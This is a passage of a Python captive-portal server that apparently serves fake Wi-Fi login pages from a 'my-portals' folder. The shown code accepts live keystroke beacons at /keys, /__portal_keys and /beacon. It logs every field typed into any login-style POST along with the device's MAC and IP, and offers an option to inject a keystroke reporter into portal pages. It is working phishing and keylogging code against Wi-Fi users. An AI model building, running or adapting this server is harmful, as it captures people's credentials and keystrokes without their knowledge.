            custom = os.path.join(self.cfg["portal_dir"], "success.html")
            if os.path.exists(custom):
                self.send_file(custom)
                return
            body = (f"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>Connected</title><body style="font-family:sans-serif;text-align:center;padding:40px">
<h1>✅ Connected</h1><p>You can now use the internet.</p>
<p><a href="http://{gateway}/">Back to portal</a></p></body>""").encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # captive probes always bounce to portal root
        if is_captive_probe(self.path):
            self.redirect(f"http://{gateway}/")
            return

        # unknown paths bounce to portal (mirrors old portal server)
        if not self.serve_portal_path(self.path):
            self.redirect(f"http://{gateway}/")

    def do_OPTIONS(self):
        # CORS preflight for same-origin + future proxy-forwarded beacons
        if urlparse(self.path).path in ("/keys", "/__portal_keys", "/beacon"):
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        self.send_error(404)

    def do_POST(self):
        gateway = self.cfg["gateway"]
        path = urlparse(self.path).path
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        ip = self.client_address[0]
        fwd_host = (self.headers.get("X-Orig-Host") or "")[:200]

        if path in ("/keys", "/__portal_keys", "/beacon"):
            # live keystrokes: single, batch, or sendBeacon (any content-type)
            count = 0
            try:
                text = raw.decode("utf-8", errors="ignore") or "{}"
                try:
                    data = json.loads(text)
                except Exception:
                    # sendBeacon fallback may arrive urlencoded
                    form = {k: v[0] for k, v in parse_qs(text).items()}
                    data = {"field": form.get("field", ""),
                            "value": form.get("value", "")}
                    if fwd_host and not data.get("page"):
                        data["page"] = fwd_host
                if isinstance(data, dict):
                    if fwd_host:
                        for e in (data.get("events") or []):
                            if isinstance(e, dict) and not e.get("page"):
                                e["page"] = fwd_host
                        if not data.get("page"):
                            data["page"] = fwd_host
                    count = ingest_keys(self.server, ip,
                                        self.client_mac(), data)
            except Exception:
                pass
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        # Any other POST ( /auth, /login, /connect, login.php, ... ):
        # log typed fields like the old server, then authorize (click/open mode).
        try:
            form = {k: v[0] for k, v in
                    parse_qs(raw.decode(errors="ignore")).items()}
        except Exception:
            form = {}
        mac = self.client_mac()
        log_submit(self.cfg["submit_log"], self.cfg["portal_name"],
                   path, ip, mac, form)

        if not mac:
            # No ARP entry (e.g. testing from localhost). Still succeed
            # so the UI flow can be verified; log clearly.
            print(f"[portal] submit from {ip} with unknown MAC "
                  f"(localhost/test?) -> success page", flush=True)
        else:
            if mac not in self.server.authorized:
                self.server.authorized.add(mac)
                save_authorized(self.cfg["state_file"],
                                self.server.authorized)
                allow_mac(self.cfg["ap_iface"], mac)
                print(f"[portal] AUTHORIZED {mac} ({ip}) via {path}",
                      flush=True)
            else:
                print(f"[portal] already authorized {mac}", flush=True)
        self.redirect(f"http://{gateway}/success")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()


def main():
    ap = argparse.ArgumentParser(description="Tiny captive portal server")
    ap.add_argument("--portal-dir", required=True,
                    help="Folder inside my-portals/ to serve")
    ap.add_argument("--gateway", default="192.168.4.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--ap-iface", default="wlan1")
    ap.add_argument("--state-file", default="run/authorized_macs")
    ap.add_argument("--submit-log", default="run/submissions.log",
                    help="Where typed form fields are logged")
    ap.add_argument("--keys-log", default="run/keystrokes.jsonl",
                    help="Append-only JSONL of every live keystroke event")
    ap.add_argument("--leases-log", default="run/dnsmasq.leases",
                    help="dnsmasq leases file for device hostnames")
    ap.add_argument("--live", default="on", choices=("on", "off"),
                    help="Inject keystroke reporter + serve /live")
    args = ap.parse_args()

    if not os.path.isdir(args.portal_dir):
        print(f"ERROR: portal folder not found: {args.portal_dir}",
              file=sys.stderr)
        print(f"HINT: pick one of: {os.path.dirname(args.portal_dir)}/*/",
              file=sys.stderr)
        sys.exit(1)
    entry = resolve_entry(args.portal_dir)
    if not os.path.exists(os.path.join(args.portal_dir, entry)):
        print(f"ERROR: no .html entry page in {args.portal_dir}",
              file=sys.stderr)
        sys.exit(1)

    authorized = load_authorized(args.state_file)
    print(f"[portal] serving {args.portal_dir} on port {args.port} "
          f"(gateway {args.gateway}, entry {entry}, live {args.live}, "
          f"{len(authorized)} already authorized)",
          flush=True)

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    server.cfg = {"portal_dir": os.path.abspath(args.portal_dir),
                  "portal_name": os.path.basename(
                      os.path.abspath(args.portal_dir)),
                  "entry": entry,
                  "gateway": args.gateway,
                  "ap_iface": args.ap_iface,
                  "state_file": args.state_file,
                  "submit_log": args.submit_log,
                  "keys_log": args.keys_log,
                  "leases_log": args.leases_log,
                  "live": args.live == "on"}
    server.authorized = authorized
    server.live = {}  # ip -> {mac, fields, page, title, active_field, tape, clients, updated}
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
